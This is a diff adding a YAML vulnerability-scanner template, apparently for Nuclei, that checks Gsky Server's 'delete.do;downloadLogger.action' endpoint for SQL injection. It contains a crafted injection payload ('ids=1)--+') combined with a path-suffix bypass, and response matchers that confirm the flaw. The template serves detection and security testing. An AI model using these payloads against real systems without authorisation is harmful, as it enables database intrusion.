@@ -1,0 +1,29 @@
+id: gsky-server-sql-injection-ct-1108574
+info:
+  name: "Gsky Server delete.do;downloadLogger.action 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Gsky
+  description: |
+    This template detects SQL injection vulnerabilities in Gsky Server endpoints by evaluating specific responses to crafted payloads.
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/run_stop/delete.do;downloadLogger.action?ids=1)--+&loadAll=1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"message":"OK"'
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":10001'
